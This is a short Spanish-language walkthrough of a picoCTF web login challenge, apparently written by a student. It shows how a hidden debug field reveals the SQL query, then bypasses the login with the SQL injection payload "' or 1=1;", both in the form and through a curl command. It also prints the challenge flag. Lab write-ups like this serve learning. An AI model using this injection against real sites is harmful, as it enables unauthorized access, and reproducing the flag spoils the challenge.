## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
## Solución 1
- Entramos a la pagina y nos dirigimos al login de la pagina.
- Inspeccionamos la pagina.
- Descubrimos que había un campo invisible para el usuario, así que modificamos el tipo para que sea visible y cambiamos su valor por 1.
```bash
<input type="hidden" name="debug" value="0">
<input name="debug" value="1">
```
- Cuando intentamos ingresar nos muestra tanto los datos de nuestro registro como la sentencia SQL que utiliza.
```bash
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
```
- Al saber que tipo de sentencia utiliza nos regresamos al formulario y modificamos el registro para que nos logre ingresar y así nos muestra la bandera.
```bash
username: ' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
```
## Solución 2
```bash
armandoPC-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=' or 1=1;&password=admin"
<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>armandoPC-picoctf@webshell:~$ 
```
## Notas Adicionales
## Referencias